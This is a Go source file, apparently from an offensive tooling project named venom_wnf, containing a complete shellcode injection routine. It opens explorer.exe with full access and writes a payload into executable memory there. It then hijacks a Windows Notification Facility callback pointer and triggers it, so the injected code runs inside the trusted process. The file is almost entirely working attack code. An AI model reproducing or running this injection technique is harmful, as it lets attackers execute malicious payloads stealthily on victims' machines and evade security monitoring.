package venom_wnf

import (
  "fmt"
  "unsafe"
  "encoding/binary"
  winapi "github.com/gonutz/w32/v2"
  my_winapi "github.com/lcfr-eth/WNF_Injector/my_winapi"
  wnf "github.com/lcfr-eth/WNFInjector/wnf"
)

func RunBlob(payload []byte) {

  // find handle to explorer.exe
  h := winapi.FindWindow("Shell_TrayWnd", "")
  fmt.Printf("[main] FindWindow explorer.exe handle		: 0x%x\n", h)

  // get pid from handle
  x, pid := winapi.GetWindowThreadProcessId(h)
  fmt.Printf("[main] GetWindowThreadProcessId handle              : 0x%x, pid: %d\n", x, pid)

  // open explorer.exe process
  handle := winapi.OpenProcess(my_winapi.PROCESS_ALL_ACCESS, bool(false), uint32(pid))
  fmt.Printf("[main] OpenProcess handle				: 0x%x\n", handle)

  // get wnf subscription table from pid
  tbl := wnf.GetUserSubFromProcess()
  fmt.Printf("[main] WNF_SUBSCRIPTION_TABLE{} found 		: 0x%08X\n", tbl)

  // get wnf user subscription from the table
  sa, us := wnf.GetUserSubFromTable(uintptr(handle), tbl)
  fmt.Printf("[main] WNF_USER_SUBSCRIPTION{} 			: 0x%08X\n", sa)
  fmt.Printf("[main] WNF_USER_SUBSCRIPTION.Callback	 	: 0x%08X\n", us.Callback)
  fmt.Printf("[main] callback offset				: 0x%08X\n", uint32(unsafe.Offsetof(us.Callback)))

  // payload := []byte{0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC}
  // allocate memory / space / in explorer.exe for payload
  allocMemAddress, _ := my_winapi.VirtualAllocEx(uintptr(handle), 0, len(payload), my_winapi.MEM_COMMIT | my_winapi.MEM_RESERVE, my_winapi.PAGE_EXECUTE_READWRITE)

  // write payload/shellcode to space / address allocated in explorer.exe
  fmt.Printf("[main] Allocated payload space			: 0x%X\n", allocMemAddress)

  my_winapi.WriteProcessMemory(uintptr(handle), uint32(allocMemAddress), payload, uint(len(payload)));

  payload_bytes := make([]byte, my_winapi.PSIZE)
  binary.LittleEndian.PutUint64(payload_bytes, uint64(allocMemAddress))

  // overwrite the wnf callback function with our own pointer to our shellcode
  fmt.Printf("[main] Writing payload at 0x%X to WNF_USER_SUBSCRIPTION.Callback pointer: 0x%X\n", allocMemAddress, (uint32(sa) + uint32(unsafe.Offsetof(us.Callback))))
  my_winapi.WriteProcessMemory(uintptr(handle), (uint32(sa) + uint32(unsafe.Offsetof(us.Callback))), payload_bytes, uint(my_winapi.PSIZE))

  fmt.Printf("[main] Triggering via UpdateWnfStateData\n")

  //Trigger Callback and execute our injected code
  my_winapi.NtUpdateWnfStateData()

  // ** ADD CLEAN UP CODE HERE ** REWRITE ORIGINAL PTRS ** //
}
